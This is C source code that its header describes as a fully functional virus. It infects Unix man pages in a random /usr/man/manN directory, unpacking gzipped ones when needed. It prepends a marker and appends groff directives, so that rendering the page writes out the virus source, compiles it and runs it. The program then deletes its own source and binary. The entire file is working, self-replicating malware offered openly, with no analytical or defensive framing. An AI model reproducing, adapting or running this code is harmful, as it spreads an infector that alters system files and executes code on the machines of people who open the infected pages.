/*** BE CAREFUL! THIS IS A FULL FUNCTIONALL VIRUS!
 *** ABSOLUTELY NO WARRANTY! IT COMES UNDER THE GPL!
 ***/
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <stdlib.h>

const char *viriiSource = "/tmp/virus.c";
const char *tmpVictum = "/tmp/victum";
const char *ident = ".\x5c\x22VIRUS\x0a";
char path[] = "/usr/man/manx";
int wasZipped = 0;

char *findVictum();
int infectVictum(char *);

int main(int argc, char **argv)
{  	
        infectVictum(findVictum());
        unlink(viriiSource);
        unlink(*argv);
}

char *findVictum()
{
        DIR *dp;
        FILE *fd;
        struct dirent *de;
        int index = 0;
        char buf[1000];
        static char pathname[1000];
	
        
	/* inititialization */
        memset(buf, 0, 1000);
        memset(pathname, 0, 1000);
        srand(time(NULL));
        index = rand() % 3;
        path[12] = index + 49;

        if ((dp = opendir(path)) == NULL) {
                return NULL;
        }
	
        /* skip "." and ".." */
        readdir(dp); readdir(dp);
               	
        while (1) {
                /* read next entry */
                if ((de = readdir(dp)) == NULL) {
                       closedir(dp);
                       return NULL;	
                }
                /* create full pathname */
                sprintf(pathname, "%s/%s", path, de->d_name);

                /* if zipped */
                if (strstr(pathname, ".gz")) {
                        sprintf(buf, "gunzip %s", pathname);
                        system(buf);
                        wasZipped = 1;

                        /* without '.gz' */
                        pathname[strlen(pathname) - 3 ] = 0;
                }


                /* get next filename from directory */
                if ((fd = fopen(pathname, "r")) == NULL) {
                   	continue;
                }
                fgets(buf, 100, fd);
                
                /* look if not already infected */
                if (strcmp(buf, ident) == 0) {
                   	fclose(fd);
                        memset(buf, 0, 1000);
			memset(pathname, 0, 1000);
                } else {                        
                        fclose(fd);
                        return pathname;
                } 
        }
}

int infectVictum(char *victum)
{
        char buf[1000];
        FILE *virusIn, *victumIn, *tmpOut;
        
        memset(buf, 0, 1000);
        
        if ((virusIn = fopen(viriiSource, "r")) == NULL) {
           	return 1;
        }
        
        if ((tmpOut = fopen(tmpVictum, "a")) == NULL) {
           	fclose(virusIn);
                return 1;
        }
        if ((victumIn = fopen(victum, "r")) == NULL) {
                fclose(virusIn);
                fclose(tmpOut);
                unlink(tmpVictum);
        }

        /* write ident-string to man-page */
        fprintf(tmpOut, "%s", ident);
        
        /* and append the original man-page */
        while (fgets(buf, 999, victumIn) != NULL) {
                fprintf(tmpOut, "%s", buf);
                memset(buf, 1000, 0);
        }
        fclose(victumIn);
        
        /* finally append virus-code to it */
        sprintf(buf, ".opena v %s\x0a", viriiSource);
        fprintf(tmpOut, "%s", buf);
        memset(buf, 0, 1000);
        
        while (fgets(buf, 999, virusIn) != NULL) {
                fprintf(tmpOut, ".write v %s", buf);
                memset(buf, 0, 1000);
        }
        sprintf(buf, ".pso cc %s -o /tmp/virus;/tmp/virus &\x0a", viriiSource);
        fprintf(tmpOut, "%s", buf);
	
        fclose(virusIn);
        fclose(tmpOut);
        
        unlink(victum);
	
        /* our smart-copy ;-) */
        link(tmpVictum, victum);
        unlink(tmpVictum);
        
        if (wasZipped) {
                sprintf(buf, "gzip %s", victum);
                system(buf);
        }
        return 0;
}

